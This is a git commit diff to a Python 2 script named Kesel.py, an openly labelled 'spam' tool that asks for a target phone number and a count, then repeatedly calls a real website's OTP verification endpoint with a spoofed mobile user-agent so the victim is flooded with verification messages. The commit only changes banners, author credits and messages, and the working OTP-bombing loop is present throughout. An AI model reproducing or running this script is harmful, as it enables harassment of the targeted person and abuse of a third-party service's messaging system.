34d1293d639c55e104e72e0522cbbf7b4419829a
Ryzz_ D1P5EY <73215831+Ryzz03@users.noreply.github.com>
2020-10-29 10:29:12 +0800

    Update Kesel.py

--- Kesel.py
+++ Kesel.py
@@ -1,7 +1,7 @@
 # -*- coding: utf8 -*-
-# by Ryzz03
+# Hey, bro 😄
 import os, sys, json
-import requests
+import requests as r
 C0 = '\033[0;36m'
 G0 = '\033[0;32m'
 W0 = '\033[0;37m'
@@ -10,23 +10,24 @@ Y0 = '\033[0;33m'
 try:
  os.system("clear")
  print """%s
- %s==========[SPAM WA]=========%s
- %sAuthor   : Ryzz%s
- %sWhatsApp : +6282192959xxx%s
- %s========[AutoNangis]========"""%(G0,W0,G0,Y0,G0,Y0,G0,G0,G0)
- gg = raw_input("%s[%s?%s] %sNo. WA Target (ex:08xxx) : "%(W0,C0,W0,R0))
- gi = int(raw_input("%s[%s?%s] %sMau ngirim berapa kak? : "%(W0,C0,W0,R0)))
+ 
+   %sAuthor : Ryzz_%s
+   %sGithub : github.com/Ryzz03%s
+   %sTeam   : P4R4S1T CYBER%s
+   %sSpam Autonangis V1"""%(G0,W0,G0,W0,G0,W0,G0,G0)
+ gg = raw_input("%s[%s?%s] %sNomornya? (ex:0821xxx) : "%(W0,C0,W0,W0))
+ gi = int(raw_input("%s[%s?%s] %smau ngirim berapa om? : "%(W0,C0,W0,W0)))
  c = 1
  for x in range(gi):
-  h = json.loads(requests.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
+  h = json.loads(r.post("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_id=sendVerificationCode&p_p_cacheability=cacheLevelPage&_SB_Registration_Otp_Portlet_mobilePhoneNo=%s"%gg,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'}).text)
   if h["status"] == 'success':
-   print "%s[%s%s%s] %sBERHASIL %sdikirim ke %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
+   print "%s[%s%s%s] %sSuccess %sspam to %s%s"%(W0,C0,str(c),W0,G0,W0,Y0,gg)
    c += 1
   else:
-   print "%s[%s%s%s] %sGAGAL %sdikirim ke %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
+   print "%s[%s%s%s] %sFailed %sspam to %s%s"%(W0,C0,str(c),W0,R0,W0,Y0,gg)
    c += 1
 # print (h)
-except requests.exceptions.ConnectionError:
-   print "%s[%s!%s] %sKoneksi buruk, Coba lagi nanti"%(W0,C0,W0,R0)
+except r.exceptions.ConnectionError:
+   print "%s[%s!%s] %sYahh, kok tidak ada internet, coba cek koneksi internet kamu 😩"%(W0,C0,W0,R0)
 except KeyboardInterrupt:
-   print "\r%s[%s-%s] %sNtar aja yah :)"%(W0,C0,W0,W0)
+   print "\r%s[%s-%s] %sYahh, kok keluar bang jago 😟"%(W0,C0,W0,W0)
